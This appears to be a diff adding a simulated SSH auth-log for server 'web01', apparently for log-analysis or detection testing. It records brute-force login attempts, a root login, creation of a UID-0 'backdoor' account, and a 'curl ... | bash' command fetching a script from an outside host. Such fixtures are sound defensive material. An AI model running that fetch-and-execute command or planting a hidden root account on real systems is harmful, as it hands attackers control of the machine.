@@ -1,0 +1,11 @@
+Mar 10 13:58:01 web01 sshd[2041]: Failed password for invalid user admin from 203.0.113.9 port 51022 ssh2
+Mar 10 13:58:03 web01 sshd[2041]: Failed password for invalid user admin from 203.0.113.9 port 51024 ssh2
+Mar 10 13:58:05 web01 sshd[2041]: Failed password for root from 203.0.113.9 port 51026 ssh2
+Mar 10 13:58:07 web01 sshd[2041]: Failed password for root from 203.0.113.9 port 51028 ssh2
+Mar 10 13:58:09 web01 sshd[2041]: Failed password for root from 203.0.113.9 port 51030 ssh2
+Mar 10 13:58:11 web01 sshd[2041]: Failed password for root from 203.0.113.9 port 51032 ssh2
+Mar 10 14:01:22 web01 sshd[2098]: Accepted password for root from 198.51.100.4 port 44510 ssh2
+Mar 10 14:02:03 web01 sudo[2110]: pam_unix(sudo:auth): authentication failure; logname=deploy uid=1001 user=deploy
+Mar 10 14:05:40 web01 useradd[2155]: new user: name=backdoor, UID=0, GID=0, home=/home/backdoor, shell=/bin/bash
+Mar 10 14:06:12 web01 bash[2170]: deploy ran: curl http://203.0.113.9/x.sh | bash
+Mar 10 14:07:01 web01 sshd[2200]: Accepted publickey for deploy from 198.51.100.4 port 44690 ssh2
